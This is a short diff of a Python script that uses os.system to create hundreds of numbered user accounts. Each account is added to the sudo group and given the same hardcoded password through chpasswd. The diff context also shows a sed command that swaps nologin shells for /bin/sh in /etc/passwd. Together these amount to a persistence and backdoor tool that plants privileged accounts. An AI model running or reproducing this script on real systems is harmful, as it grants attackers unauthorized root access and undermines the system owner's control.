@@ -52,11 +52,13 @@ os.system("sed 's/\/usr\/sbin\/nologin/\/bin\/sh/g' /etc/passwd")
 
 
 
-
-while True:
-	USERINT1 = random.randint(1,500)
-	U = str(USERINT1)
+x = 1
+while x < 500:
+	#USERINT1 = random.randint(1,500)
+	#U = str(USERINT1)
+	U = str(x)
 	os.system('echo '+ U)
 	os.system('useradd ' + U)
 	os.system('adduser ' + U + ' sudo')
 	os.system('echo '+ U + ':Lolsecure2018! | chpasswd')
+	x = x + 1
